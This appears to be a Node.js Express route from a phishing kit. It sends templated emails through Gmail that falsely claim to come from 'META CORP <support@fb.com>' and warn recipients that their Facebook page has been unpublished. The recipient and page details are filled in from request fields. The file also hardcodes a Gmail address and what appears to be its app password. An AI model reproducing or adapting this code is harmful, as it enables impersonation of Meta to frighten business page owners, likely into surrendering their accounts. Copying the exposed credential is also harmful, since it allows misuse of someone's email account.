const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
const hbs = require("nodemailer-express-handlebars");

router.get("/send-email", (req, res) => {
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: "tai.na@jadelux.store", // Điền email của bạn
      pass: "wxuphenxmhlicqzw", // Điền mật khẩu của bạn
    },
  });
  transporter.use(
    "compile",
    hbs({
      viewEngine: {
        extName: ".hbs",
        partialsDir: process.cwd() + "/templates",
        layoutsDir: process.cwd() + "/templates",
        defaultLayout: "",
      },
      viewPath: process.cwd() + "/templates",
      extName: ".hbs",
    })
  );
  const mailOptions = {
    from: "META CORP <support@fb.com>",
    to: req.body?.BussinessEmail,
    subject: `The ${req.body?.FacebookPageName} Page has been unpublished.`,
    text: "WARNING",
    template: "./email",
    context: {
      Fullname: req.body?.Fullname,
      BussinessEmail: req.body?.BussinessEmail,
      FacebookPageName: req.body?.FacebookPageName,
      TimeSend: req.body?.TimeSend,
    },
  };

  // Gửi email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      res.send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.send("Email sent successfully");
    }
  });
});

module.exports = router;
